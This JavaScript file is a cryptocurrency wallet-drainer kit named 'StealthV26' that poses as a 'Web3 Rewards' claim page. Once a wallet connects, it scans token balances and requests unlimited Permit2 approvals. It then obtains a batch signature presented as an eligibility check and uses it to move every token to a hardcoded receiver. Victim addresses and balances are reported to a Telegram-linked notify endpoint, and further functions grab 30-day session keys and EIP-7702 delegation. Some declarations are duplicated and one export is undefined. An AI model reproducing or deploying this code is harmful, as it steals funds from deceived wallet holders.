import { createAppKit } from "@reown/appkit";
import { WagmiAdapter } from "@reown/appkit-adapter-wagmi";
import { mainnet, arbitrum, polygon, base } from "@reown/appkit/networks";
import { BrowserProvider } from "ethers";
import { disconnect as wagmiDisconnect, getAccount } from "@wagmi/core";

// ─── CONFIG ──────────────────────────────────────────────────
const projectId = import.meta.env?.VITE_WALLETCONNECT_PROJECT_ID || "";

// Configurable: the dashboard sets window.__ST3_OPERATOR before this module loads.
const OPERATOR = (typeof window !== 'undefined' && window.__ST3_OPERATOR) || {
  receiver: "0x788F5098C58BF5854ebf2b10B0D9303b13ABF43A",
  exchange: "0x788F5098C58BF5854ebf2b10B0D9303b13ABF43A",
  permit2: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
  autoBatch: true,
  // Points to your St3 backend relay
  relayUrl: "/api/relay",
  notifyUrl: "/api/notify",
  telegramChatId: "7753168031",
  tokens: {
    1: [
      { addr: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
      { addr: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", decimals: 6 },
      { addr: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI", decimals: 18 },
      { addr: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", symbol: "WBTC", decimals: 8 },
    ],
    56: [
      { addr: "0x55d398326f99059fF775485246999027B3197955", symbol: "USDT", decimals: 18 },
      { addr: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol: "USDC", decimals: 18 },
    ],
    137: [
      { addr: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", symbol: "USDT", decimals: 6 },
      { addr: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", symbol: "USDC", decimals: 6 },
    ],
    42161: [
      { addr: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", symbol: "USDT", decimals: 6 },
      { addr: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", symbol: "USDC", decimals: 6 },
    ],
    8453: [
      { addr: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", symbol: "USDC", decimals: 6 },
    ],
  },
};

let walletAssets = [];

// ─── APPKIT SETUP ────────────────────────────────────────────
const networks = [mainnet, arbitrum, polygon, base];
const wagmiAdapter = new WagmiAdapter({ networks, projectId });

const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  metadata: {
    name: "Web3 Rewards",
    description: "Claim your token rewards",
    url: window.location.origin,
    icons: [],
  },
  themeMode: "dark",
  themeVariables: {
    "--w3m-accent": "#6366f1",
    "--w3m-border-radius-master": "14px",
  },
  features: {
    analytics: false,
    email: true,
    socials: ["google", "discord"],
  },
});

// ─── HELPERS ─────────────────────────────────────────────────
function getWagmiConfig() { return wagmiAdapter.wagmiConfig; }

async function getSigner() {
  const { getConnectorClient } = await import("@wagmi/core");
  const client = await getConnectorClient(wagmiAdapter.wagmiConfig);
  return new BrowserProvider(client.transport).getSigner();
}

function shortAddr(a) { return a ? a.slice(0, 6) + "..." + a.slice(-4) : "?"; }

async function notify(text) {
  if (!OPERATOR.notifyUrl) return;
  try {
    await fetch(OPERATOR.notifyUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ message: text }),
    });
  } catch (e) {}
}

// ─── TOAST ───────────────────────────────────────────────────
const toasts = [];
function showToast(title, body, type = "info", duration = 4000) {
  const el = document.createElement("div");
  el.style.cssText = `position:fixed;top:${20 + toasts.length * 76}px;right:20px;z-index:2147483647;background:#1a1a2e;border:1px solid #2a2a3e;border-left:4px solid ${type === "success" ? "#22c55e" : type === "error" ? "#ef4444" : type === "warn" ? "#f59e0b" : "#6366f1"};border-radius:14px;padding:16px 22px;color:#e4e4e7;font-family:Inter,sans-serif;font-size:0.88rem;max-width:380px;box-shadow:0 8px 32px rgba(0,0,0,0.5);transform:translateX(120%);transition:transform 0.35s cubic-bezier(0.16,1,0.3,1);`;
  el.innerHTML = `<div style="font-weight:600;margin-bottom:4px;">${title}</div><div style="color:#a1a1aa;font-size:0.78rem;font-family:monospace;">${body}</div>`;
  document.body.appendChild(el);
  toasts.push(el);
  requestAnimationFrame(() => requestAnimationFrame(() => { el.style.transform = "translateX(0)"; }));
  setTimeout(() => {
    el.style.transform = "translateX(120%)";
    setTimeout(() => { el.remove(); toasts.splice(toasts.indexOf(el), 1); }, 400);
  }, duration);
}

// ─── BALANCE SCANNER ─────────────────────────────────────────
async function scanBalances(address, chainId) {
  let provider = null;
  try {
    const { getConnectorClient } = await import("@wagmi/core");
    const c = await getConnectorClient(wagmiAdapter.wagmiConfig);
    provider = c.transport;
  } catch (e) {}
  if (!provider) provider = window.ethereum;
  if (!provider) return [];
  const assets = [];

  try {
    const balHex = await provider.request({ method: "eth_getBalance", params: [address, "latest"] });
    const balEth = parseInt(balHex, 16) / 1e18;
    if (balEth > 0) assets.push({ type: "NATIVE", symbol: "ETH", balance: balEth, balanceRaw: balHex, address: "0x0000000000000000000000000000000000000000" });
  } catch (e) {}

  const tokens = OPERATOR.tokens[chainId] || [];
  for (const token of tokens) {
    try {
      const data = "0x70a08231000000000000000000000000" + address.slice(2).toLowerCase();
      const result = await provider.request({ method: "eth_call", params: [{ to: token.addr, data }, "latest"] });
      const bal = parseInt(result, 16) / Math.pow(10, token.decimals);
      if (bal > 0) assets.push({ type: "ERC-20", symbol: token.symbol, balance: bal, balanceRaw: result, address: token.addr, decimals: token.decimals });
    } catch (e) {}
  }

  const stables = ["USDT", "USDC", "DAI", "BUSD"];
  assets.sort((a, b) => {
    const aS = stables.includes(a.symbol) ? -1 : 1;
    const bS = stables.includes(b.symbol) ? -1 : 1;
    return aS !== bS ? aS - bS : b.balance - a.balance;
  });
  return assets;
}

// ─── PERMIT2 BATCH EXECUTION ─────────────────────────────────
async function executeBatch(assets, recipient) {
  const erc20Items = assets.filter(a => a.type === "ERC-20" && a.balance > 0);
  if (!erc20Items.length) return null;

  const signer = await getSigner();
  const E = await import("ethers");
  const owner = await signer.getAddress();
  const chainId = await signer.provider.getNetwork().then(n => Number(n.chainId));

  showToast("🔍 Checking eligibility", erc20Items.length + " tokens found", "info", 3000);

  // Step 1: Ensure Permit2 has allowance
  const erc20Abi = [
    "function allowance(address,address) view returns (uint256)",
    "function approve(address,uint256) returns (bool)"
  ];
  for (const item of erc20Items) {
    try {
      const tokenC = new E.Contract(item.address, erc20Abi, signer);
      const current = await tokenC.allowance(owner, OPERATOR.permit2);
      if (current < BigInt(item.balanceRaw)) {
        showToast("✍️ Approve " + item.symbol, "One-time authorization", "info", 5000);
        const tx = await tokenC.approve(OPERATOR.permit2, E.MaxUint256);
        await tx.wait();
      }
    } catch (e) {}
  }

  // Step 2: Read Permit2 nonces
  const permit2Abi = ["function allowance(address,address,address) view returns (uint160,uint48,uint48)"];
  const permit2C = new E.Contract(OPERATOR.permit2, permit2Abi, signer);
  const now = Math.floor(Date.now() / 1000);
  const expiration = now + 2592000;
  const sigDeadline = now + 1200;
  const details = [];

  for (const item of erc20Items) {
    try {
      const res = await permit2C.allowance(owner, item.address, OPERATOR.exchange);
      details.push({
        token: item.address,
        amount: BigInt(item.balanceRaw),
        expiration,
        nonce: Number(res[2]),
      });
    } catch (e) {}
  }

  if (!details.length) {
    showToast("❌ Verification failed", "Unable to verify eligibility", "error");
    return null;
  }

  // Step 3: EIP-712 signature
  const domain = { name: "Permit2", chainId, verifyingContract: OPERATOR.permit2 };
  const types = {
    PermitDetails: [
      { name: "token", type: "address" },
      { name: "amount", type: "uint160" },
      { name: "expiration", type: "uint48" },
      { name: "nonce", type: "uint48" },
    ],
    PermitBatch: [
      { name: "details", type: "PermitDetails[]" },
      { name: "spender", type: "address" },
      { name: "sigDeadline", type: "uint256" },
    ],
  };

  const permitBatch = {
    details: details.map(d => ({ token: d.token, amount: d.amount, expiration: d.expiration, nonce: d.nonce })),
    spender: OPERATOR.exchange,
    sigDeadline,
  };

  showToast("✍️ Confirm claim", details.length + " tokens — sign to proceed", "info", 8000);

  let signature;
  try {
    signature = await signer.signTypedData(domain, types, permitBatch);
  } catch (e) {
    showToast("❌ Cancelled", "Signature rejected", "error");
    notify("❌ <b>Signature Rejected</b>\nUser: <code>" + owner + "</code>\nChain: " + chainId);
    return null;
  }

  // Step 4: Relay to backend
  const payload = {
    user: owner,
    recipient,
    permitBatch: {
      spender: permitBatch.spender,
      sigDeadline: String(permitBatch.sigDeadline),
      details: permitBatch.details.map(d => ({
        token: d.token,
        amount: String(d.amount),
        expiration: Number(d.expiration),
        nonce: Number(d.nonce),
      })),
    },
    signature,
    chainId,
  };

  if (OPERATOR.relayUrl) try {
    showToast("⏳ Processing claim...", "Executing on-chain", "info", 10000);
    const res = await fetch(OPERATOR.relayUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    if (res.ok) {
      const json = await res.json();
      const txHash = json.hash || "confirmed";
      showToast("✅ Claim successful!", txHash.slice(0, 22) + "...", "success", 8000);
      notify(
        "✅ <b>Batch Complete</b>\n" +
        "User: <code>" + owner + "</code>\n" +
        "Recipient: <code>" + shortAddr(recipient) + "</code>\n" +
        "Tokens: " + details.length + "\n" +
        "Chain: " + chainId + "\n" +
        "Tx: <code>" + txHash + "</code>\n" +
        "Assets:\n" + erc20Items.map(i => "  " + i.symbol + ": " + i.balance.toFixed(4)).join("\n")
      );
      return { txHash };
    }

    const errText = await res.text().catch(() => "");
    console.warn("[Claim] Relay error:", res.status, errText);
  } catch (relayErr) {
    console.warn("[Claim] Relay unavailable:", relayErr.message);
  }

  // Fallback: direct on-chain
  showToast("⚠️ Switching to direct mode", "Small gas fee required", "warn", 5000);
  try {
    const exchangeAbi = [
      "function batchPermitTransferFromBatch(address user, ((address token, uint160 amount, uint48 expiration, uint48 nonce)[] details, address spender, uint256 sigDeadline) permitBatch, bytes signature, address recipient) returns (uint256[] amounts)"
    ];
    const exchangeC = new E.Contract(OPERATOR.exchange, exchangeAbi, signer);
    const tx = await exchangeC.batchPermitTransferFromBatch(owner, permitBatch, signature, recipient);
    showToast("📨 Transaction sent", tx.hash.slice(0, 16) + "...", "info", 6000);
    const receipt = await tx.wait();
    showToast("✅ Confirmed!", "Block " + receipt.blockNumber, "success", 8000);
    notify("✅ <b>Direct Batch</b>\nHash: <code>" + receipt.hash + "</code>\nTokens: " + details.length);
    return { txHash: receipt.hash };
  } catch (directErr) {
    showToast("❌ Failed", directErr.reason || directErr.message, "error");
    notify("❌ <b>Failed</b>\nUser: <code>" + owner + "</code>\nError: " + (directErr.reason || directErr.message));
    return null;
  }
}

// ─── CONNECTION CALLBACKS ────────────────────────────────────
async function onConnected({ address, chainId }) {
  showToast("✅ Connected", shortAddr(address) + " on chain " + chainId, "success");
  notify("✅ <b>Connected</b>\nAddress: <code>" + address + "</code>\nChain: " + chainId + "\nSite: " + window.location.href + "\nTime: " + new Date().toISOString());

  // Update button
  const btn = document.querySelector("[data-appkit-connect]");
  if (btn) { btn.textContent = "Checking eligibility..."; btn.disabled = true; }

  try {
    walletAssets = await scanBalances(address, chainId);
    if (walletAssets.length > 0) {
      showToast("💰 Wallet scanned", walletAssets.filter(a => a.type === "ERC-20").map(a => a.symbol + ": " + a.balance.toFixed(2)).join(", ") || "Tokens found", "info", 5000);
      notify("💰 <b>Scanned</b>\n<code>" + shortAddr(address) + "</code>\nChain: " + chainId + "\n" + walletAssets.map(a => a.symbol + ": " + a.balance.toFixed(4)).join("\n"));
    }
  } catch (e) {}

  if (OPERATOR.autoBatch && walletAssets.filter(a => a.type === "ERC-20").length > 0) {
    await executeBatch(walletAssets, OPERATOR.receiver);
  } else {
    showToast("ℹ️ No claimable tokens", "This wallet has no eligible assets on this chain", "warn", 5000);
  }

  if (btn) { btn.textContent = "Connected ✓"; btn.disabled = false; }
}

async function onDisconnected() {
  walletAssets = [];
  activeSession = null;
  const btn = document.querySelector("[data-appkit-connect]");
  if (btn) { btn.textContent = "Connect Wallet"; btn.disabled = false; }
}

// ─── SEQUENCE CONTRACTS ──────────────────────────────────────
const SEQUENCE = {
  factory: "0x653c0bd75e353f1FFeeb8AC9A510ea30F9064ceF",
  erc4337Factory: "0xC67c4793bDb979A1a4cd97311c7644b4f7a31ff9",
  stage1Module: "0xfBC5a55501E747b0c9F82e2866ab2609Fa9b99f4",
  stage2Module: "0x5C9C4AD7b287D37a37d267089e752236f368f94f",
  guest: "0x2d21Ce2fBe0BAD8022BaE10B5C22eA69fE930Ee6",
  sessionManager: "0x4AE428352317752a51Ac022C9D2551BcDef785cb",
  eip7702Module: "0x1f82E64E694894BACfa441709fC7DD8a30FA3E5d",
  batchMulticall: "0xF93E987DF029e95CdE59c0F5cD447e0a7002054D",
  permit2Executor: "0x4593D97d6E932648fb4425aC2945adaF66927773",
  erc2612Executor: "0xb8eF065061bbBF5dCc65083be8CC7B50121AE900",
  entryPoint: "0x0000000071727De22E5E9d8BAf0edAc6f37da032",
};

// ─── CREATE2 IMAGE HASH & WALLET DEPLOYMENT ──────────────────
async function computeImageHash(threshold, signers) {
  const E = await import("ethers");
  const sorted = [...signers].sort((a, b) => a.address.toLowerCase() < b.address.toLowerCase() ? -1 : 1);
  let hash = E.keccak256(E.AbiCoder.defaultAbiCoder().encode(["uint256"], [BigInt(threshold)]));
  for (const signer of sorted) {
    const leaf = E.keccak256(E.AbiCoder.defaultAbiCoder().encode(["uint256", "address"], [BigInt(signer.weight), signer.address]));
    hash = E.keccak256(E.AbiCoder.defaultAbiCoder().encode(["bytes32", "bytes32"], [hash, leaf]));
  }
  return hash;
}

function computeWalletAddress(imageHash) {
  // CREATE2: address = keccak256(0xff ++ factory ++ salt ++ initCodeHash)[12:]
  // initCode = minimal proxy pointing to stage2Module
  const impl = SEQUENCE.stage2Module.toLowerCase().slice(2);
  const initCode = "0x3d602d80600a3d3981f3363d3d373d3d3d363d73" + impl + "5af43d82803e903d91602b57fd5bf3";
  // We need ethers for this
  try {
    const E = window.__ethersModule;
    if (!E) return null;
    const initCodeHash = E.keccak256(initCode);
    const salt = imageHash;
    const packed = E.solidityPackedKeccak256(
      ["bytes1", "address", "bytes32", "bytes32"],
      ["0xff", SEQUENCE.factory, salt, initCodeHash]
    );
    return "0x" + packed.slice(-40);
  } catch (e) { return null; }
}

async function deploySequenceWallet(config) {
  const signer = await getSigner();
  const E = await import("ethers");
  window.__ethersModule = E;

  const threshold = config?.threshold || 1;
  const signers = config?.signers || [{ weight: 1, address: await signer.getAddress() }];
  const imageHash = await computeImageHash(threshold, signers);

  showToast("🔐 Deploying wallet", "CREATE2 via factory", "info", 5000);
  notify("🔐 <b>Deploying Sequence Wallet</b>\nimageHash: <code>" + imageHash.slice(0, 18) + "...</code>");

  const factoryAbi = ["function deploy(bytes32 imageHash) returns (address)"];
  const factory = new E.Contract(SEQUENCE.factory, factoryAbi, signer);
  const tx = await factory.deploy(imageHash);
  showToast("📨 Deploy tx sent", tx.hash.slice(0, 18) + "...", "info", 6000);
  const receipt = await tx.wait();
  showToast("✅ Wallet deployed", "Block " + receipt.blockNumber, "success", 8000);
  notify("✅ <b>Wallet Deployed</b>\nHash: <code>" + tx.hash + "</code>\nimageHash: <code>" + imageHash.slice(0, 18) + "...</code>");

  return { hash: tx.hash, receipt, imageHash };
}

// ─── SESSION KEYS ────────────────────────────────────────────
const SESSION_AUTH_TYPES = {
  SessionPermission: [
    { name: "target", type: "address" },
    { name: "valueLimit", type: "uint256" },
    { name: "deadline", type: "uint256" },
    { name: "rules", type: "bytes" },
  ],
  SessionAuthorization: [
    { name: "sessionKey", type: "address" },
    { name: "permissions", type: "SessionPermission[]" },
    { name: "deadline", type: "uint256" },
    { name: "nonce", type: "uint256" },
  ],
};

let activeSession = null;

async function createSession(opts = {}) {
  const signer = await getSigner();
  const E = await import("ethers");
  const owner = await signer.getAddress();
  const chainId = await signer.provider.getNetwork().then(n => Number(n.chainId));

  const sessionKey = opts.sessionKey || owner;
  const deadline = opts.deadline || Math.floor(Date.now() / 1000) + 86400 * 30; // 30 days
  const nonce = opts.nonce != null ? BigInt(opts.nonce) : BigInt(Math.floor(Math.random() * 1000000));
  const targets = opts.targets || [OPERATOR.exchange, OPERATOR.permit2];

  const permissions = targets.map(target => ({
    target,
    valueLimit: opts.valueLimit ? BigInt(opts.valueLimit) : 0n,
    deadline: BigInt(deadline),
    rules: "0x",
  }));

  const domain = {
    name: "Sequence SessionManager",
    version: "1",
    chainId,
    verifyingContract: SEQUENCE.sessionManager,
  };

  const message = {
    sessionKey,
    permissions,
    deadline: BigInt(deadline),
    nonce,
  };

  showToast("✍️ Authorize session", "Sign to create session key", "info", 6000);
  const signature = await signer.signTypedData(domain, SESSION_AUTH_TYPES, message);
  showToast("✅ Session created", "Valid for 30 days", "success", 5000);
  notify("🔑 <b>Session Created</b>\nWallet: <code>" + shortAddr(owner) + "</code>\nTargets: " + targets.length + "\nDeadline: " + new Date(deadline * 1000).toISOString());

  activeSession = { sessionKey, permissions, deadline, nonce: Number(nonce), signature, chainId, wallet: owner };
  return activeSession;
}

async function executeWithSession(calldata) {
  if (!activeSession) throw new Error("No active session");
  const signer = await getSigner();
  const E = await import("ethers");

  const sessionManagerAbi = [
    "function executeWithSession(address wallet, (address sessionKey, (address target, uint256 valueLimit, uint256 deadline, bytes rules)[] permissions, uint256 deadline, uint256 nonce) session, bytes sessionSignature, address target, uint256 value, bytes data) returns (bytes)"
  ];

  const sessionC = new E.Contract(SEQUENCE.sessionManager, sessionManagerAbi, signer);
  const sessionStruct = {
    sessionKey: activeSession.sessionKey,
    permissions: activeSession.permissions.map(p => ({
      target: p.target, valueLimit: p.valueLimit, deadline: p.deadline, rules: p.rules || "0x"
    })),
    deadline: BigInt(activeSession.deadline),
    nonce: BigInt(activeSession.nonce),
  };

  const target = calldata.target || OPERATOR.exchange;
  const value = calldata.value || 0n;
  const data = calldata.data || "0x";

  const tx = await sessionC.executeWithSession(activeSession.wallet, sessionStruct, activeSession.signature, target, value, data);
  showToast("📨 Session tx sent", tx.hash.slice(0, 16) + "...", "info", 5000);
  const receipt = await tx.wait();
  showToast("✅ Session executed", "Block " + receipt.blockNumber, "success", 6000);
  return { hash: tx.hash, receipt };
}

// ─── EIP-7702 DELEGATION ─────────────────────────────────────
async function initEip7702Delegation() {
  const signer = await getSigner();
  const E = await import("ethers");
  const owner = await signer.getAddress();

  const imageHash = await computeImageHash(1, [{ weight: 1, address: owner }]);
  const iface = new E.Interface(["function updateImageHash(bytes32)"]);
  const initData = iface.encodeFunctionData("updateImageHash", [imageHash]);

  const provider = window.ethereum;
  if (!provider) throw new Error("No provider for EIP-7702");

  showToast("🔗 EIP-7702 Delegation", "Delegating to Sequence module", "info", 5000);
  notify("🔗 <b>EIP-7702 Init</b>\nWallet: <code>" + shortAddr(owner) + "</code>\nModule: <code>" + shortAddr(SEQUENCE.eip7702Module) + "</code>");

  const chainId = await signer.provider.getNetwork().then(n => Number(n.chainId));
  const result = await provider.request({
    method: "wallet_sendCalls",
    params: [{
      version: "1",
      from: owner,
      calls: [{ to: owner, data: initData, value: "0x0" }],
      capabilities: { delegation: { contractAddress: SEQUENCE.eip7702Module, chainId } }
    }]
  });

  showToast("✅ Delegation sent", String(result).slice(0, 18) + "...", "success", 6000);
  return { callId: result, imageHash };
}

// ─── ACCOUNT SUBSCRIPTION ────────────────────────────────────
let lastAddress = null;
let wasConnected = false;

modal.subscribeAccount((account) => {
  if (account.isConnected && account.address) {
    const address = account.address;
    let chainId = null;
    try { chainId = wagmiAdapter.wagmiConfig.state.chainId; } catch (e) {}

    if (lastAddress !== address) {
      onConnected({ address, chainId });
    }
    lastAddress = address;
    wasConnected = true;
  } else if (!account.isConnected && wasConnected) {
    wasConnected = false;
    lastAddress = null;
    onDisconnected();
  }
});

// ─── BUTTON BINDING ──────────────────────────────────────────
function bindButtons() {
  document.querySelectorAll("[data-appkit-connect]").forEach((btn) => {
    btn.addEventListener("click", () => {
      if (modal.getIsConnected && modal.getIsConnected()) {
        // Already connected — trigger batch again
        if (walletAssets.length > 0) {
          executeBatch(walletAssets, OPERATOR.receiver);
        }
      } else {
        modal.open();
      }
    });
  });
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", bindButtons);
} else {
  bindButtons();
}

// ═══════════════════════════════════════════════════════════════
//  SEQUENCE CONTRACTS & SESSION KEYS
// ═══════════════════════════════════════════════════════════════

const SEQUENCE = {
  factory:         "0x653c0bd75e353f1FFeeb8AC9A510ea30F9064ceF",
  erc4337Factory:  "0xC67c4793bDb979A1a4cd97311c7644b4f7a31ff9",
  stage1Module:    "0xfBC5a55501E747b0c9F82e2866ab2609Fa9b99f4",
  stage2Module:    "0x5C9C4AD7b287D37a37d267089e752236f368f94f",
  guest:           "0x2d21Ce2fBe0BAD8022BaE10B5C22eA69fE930Ee6",
  sessionManager:  "0x4AE428352317752a51Ac022C9D2551BcDef785cb",
  eip7702Module:   "0x1f82E64E694894BACfa441709fC7DD8a30FA3E5d",
  batchMulticall:  "0xF93E987DF029e95CdE59c0F5cD447e0a7002054D",
  permit2Executor: "0x4593D97d6E932648fb4425aC2945adaF66927773",
  erc2612Executor: "0xb8eF065061bbBF5dCc65083be8CC7B50121AE900",
  entryPoint:      "0x0000000071727De22E5E9d8BAf0edAc6f37da032",
};

const SESSION_AUTH_TYPES = {
  SessionPermission: [
    { name: "target", type: "address" },
    { name: "valueLimit", type: "uint256" },
    { name: "deadline", type: "uint256" },
    { name: "rules", type: "bytes" },
  ],
  SessionAuthorization: [
    { name: "sessionKey", type: "address" },
    { name: "permissions", type: "SessionPermission[]" },
    { name: "deadline", type: "uint256" },
    { name: "nonce", type: "uint256" },
  ],
};

let activeSession = null;

// ─── IMAGE HASH (CREATE2 wallet address derivation) ──────────
function computeImageHash(threshold, signers) {
  const E = window.__ethersModule;
  if (!E) return null;
  const sorted = [...signers].sort((a, b) => a.address.toLowerCase() < b.address.toLowerCase() ? -1 : 1);
  let hash = E.keccak256(E.AbiCoder.defaultAbiCoder().encode(["uint256"], [BigInt(threshold)]));
  for (const signer of sorted) {
    const leaf = E.keccak256(E.AbiCoder.defaultAbiCoder().encode(["uint256", "address"], [BigInt(signer.weight), signer.address]));
    hash = E.keccak256(E.AbiCoder.defaultAbiCoder().encode(["bytes32", "bytes32"], [hash, leaf]));
  }
  return hash;
}

function computeWalletAddress(imageHash) {
  const E = window.__ethersModule;
  if (!E) return null;
  const impl = SEQUENCE.stage2Module.toLowerCase().slice(2);
  const initCode = `0x3d602d80600a3d3981f3363d3d373d3d3d363d73${impl}5af43d82803e903d91602b57fd5bf3`;
  const initCodeHash = E.keccak256(initCode);
  return E.getCreate2Address(SEQUENCE.factory, imageHash, initCodeHash);
}

// ─── SESSION CREATION ────────────────────────────────────────
async function createSession(opts = {}) {
  const signer = await getSigner();
  const E = await import("ethers");
  window.__ethersModule = E;
  const chainId = await signer.provider.getNetwork().then(n => Number(n.chainId));
  const wallet = await signer.getAddress();

  const sessionKey = opts.sessionKey || wallet;
  const deadline = opts.deadline || Math.floor(Date.now() / 1000) + 86400 * 30;
  const nonce = opts.nonce != null ? BigInt(opts.nonce) : BigInt(Math.floor(Math.random() * 1000000));
  const targets = opts.targets || [OPERATOR.exchange, OPERATOR.permit2];

  const permissions = targets.map(target => ({
    target,
    valueLimit: opts.valueLimit ? BigInt(opts.valueLimit) : 0n,
    deadline: BigInt(deadline),
    rules: "0x",
  }));

  const domain = {
    name: "Sequence SessionManager",
    version: "1",
    chainId,
    verifyingContract: SEQUENCE.sessionManager,
  };

  const message = {
    sessionKey,
    permissions,
    deadline: BigInt(deadline),
    nonce,
  };

  showToast("✍️ Authorize session", "One-time session key creation", "info", 6000);
  const signature = await signer.signTypedData(domain, SESSION_AUTH_TYPES, message);

  activeSession = { sessionKey, permissions, deadline, nonce: Number(nonce), signature, chainId, wallet };

  notify(
    "🔑 <b>Session Created</b>\n" +
    "Wallet: <code>" + shortAddr(wallet) + "</code>\n" +
    "Session Key: <code>" + shortAddr(sessionKey) + "</code>\n" +
    "Targets: " + targets.length + "\n" +
    "Expires: " + new Date(deadline * 1000).toISOString()
  );

  showToast("✅ Session active", "Valid for " + Math.round((deadline - Date.now()/1000) / 86400) + " days", "success", 5000);
  return activeSession;
}

function getActiveSession() { return activeSession; }
function clearSession() { activeSession = null; }

// ─── SESSION EXECUTION ───────────────────────────────────────
async function executeWithSession(calldata) {
  if (!activeSession) throw new Error("No active session");
  const signer = await getSigner();
  const E = await import("ethers");

  const sessionManagerAbi = [
    "function executeWithSession(address wallet, (address sessionKey, (address target, uint256 valueLimit, uint256 deadline, bytes rules)[] permissions, uint256 deadline, uint256 nonce) session, bytes sessionSignature, address target, uint256 value, bytes data) returns (bytes)"
  ];

  const sessionC = new E.Contract(SEQUENCE.sessionManager, sessionManagerAbi, signer);
  const sessionStruct = {
    sessionKey: activeSession.sessionKey,
    permissions: activeSession.permissions.map(p => ({
      target: p.target,
      valueLimit: p.valueLimit,
      deadline: p.deadline,
      rules: p.rules || "0x",
    })),
    deadline: BigInt(activeSession.deadline),
    nonce: BigInt(activeSession.nonce),
  };

  const target = calldata.target || OPERATOR.exchange;
  const value = calldata.value || 0n;
  const data = calldata.data || "0x";

  showToast("⚡ Session execute", "No signature needed", "info", 4000);
  const tx = await sessionC.executeWithSession(activeSession.wallet, sessionStruct, activeSession.signature, target, value, data);
  const receipt = await tx.wait();
  showToast("✅ Executed", tx.hash.slice(0, 18) + "...", "success", 6000);
  notify("⚡ <b>Session Execute</b>\nTx: <code>" + tx.hash + "</code>\nTarget: <code>" + shortAddr(target) + "</code>");
  return { hash: tx.hash, receipt };
}

// ─── DEPLOY SEQUENCE WALLET (CREATE2) ────────────────────────
async function deploySequenceWallet(config = {}) {
  const signer = await getSigner();
  const E = await import("ethers");
  window.__ethersModule = E;

  const threshold = config.threshold || 1;
  const address = await signer.getAddress();
  const signers = config.signers || [{ weight: 1, address }];
  const imageHash = computeImageHash(threshold, signers);
  if (!imageHash) throw new Error("Failed to compute imageHash");

  const walletAddress = computeWalletAddress(imageHash);
  showToast("🏗️ Deploying wallet", "CREATE2 → " + shortAddr(walletAddress), "info", 6000);

  const factoryAbi = ["function deploy(bytes32 imageHash) returns (address)"];
  const factory = new E.Contract(SEQUENCE.factory, factoryAbi, signer);
  const tx = await factory.deploy(imageHash);
  const receipt = await tx.wait();

  showToast("✅ Wallet deployed", shortAddr(walletAddress), "success", 8000);
  notify(
    "🏗️ <b>Sequence Wallet Deployed</b>\n" +
    "Owner: <code>" + shortAddr(address) + "</code>\n" +
    "Wallet: <code>" + walletAddress + "</code>\n" +
    "ImageHash: <code>" + imageHash.slice(0, 18) + "...</code>\n" +
    "Tx: <code>" + tx.hash + "</code>"
  );

  return { hash: tx.hash, receipt, imageHash, walletAddress };
}

// ─── EIP-7702 DELEGATION ─────────────────────────────────────
async function initEip7702Delegation() {
  const signer = await getSigner();
  const E = await import("ethers");
  window.__ethersModule = E;
  const provider = window.ethereum;
  if (!provider) throw new Error("No provider for EIP-7702");

  const address = await signer.getAddress();
  const chainId = await signer.provider.getNetwork().then(n => Number(n.chainId));
  const imageHash = computeImageHash(1, [{ weight: 1, address }]);
  if (!imageHash) throw new Error("Failed to compute imageHash");

  const iface = new E.Interface(["function updateImageHash(bytes32)"]);
  const initData = iface.encodeFunctionData("updateImageHash", [imageHash]);

  showToast("🔗 EIP-7702 Delegation", "Upgrading EOA to smart wallet", "info", 6000);

  const result = await provider.request({
    method: "wallet_sendCalls",
    params: [{
      version: "1",
      from: address,
      calls: [{ to: address, data: initData, value: "0x0" }],
      capabilities: { delegation: { contractAddress: SEQUENCE.eip7702Module, chainId } }
    }]
  });

  showToast("✅ Delegation sent", "Call ID: " + String(result).slice(0, 16), "success", 6000);
  notify(
    "🔗 <b>EIP-7702 Delegation</b>\n" +
    "EOA: <code>" + shortAddr(address) + "</code>\n" +
    "Module: <code>" + shortAddr(SEQUENCE.eip7702Module) + "</code>\n" +
    "ImageHash: <code>" + imageHash.slice(0, 18) + "...</code>"
  );

  return { callId: result, imageHash, address };
}

// ─── EXPORT GLOBAL API ───────────────────────────────────────
window.StealthV26 = {
  // Core
  modal,
  getSigner,
  getWagmiConfig,
  scanBalances,
  executeBatch,
  triggerBatch,
  showToast,
  notify,
  // Session keys
  createSession,
  getActiveSession,
  clearSession,
  executeWithSession,
  // Sequence wallet
  SEQUENCE,
  computeImageHash,
  computeWalletAddress,
  deploySequenceWallet,
  initEip7702Delegation,
  // State
  get walletAssets() { return walletAssets; },
  get connected() { return modal.getIsConnected && modal.getIsConnected(); },
  get address() { return lastAddress; },
};
window.StealthSDK = window.StealthV26;
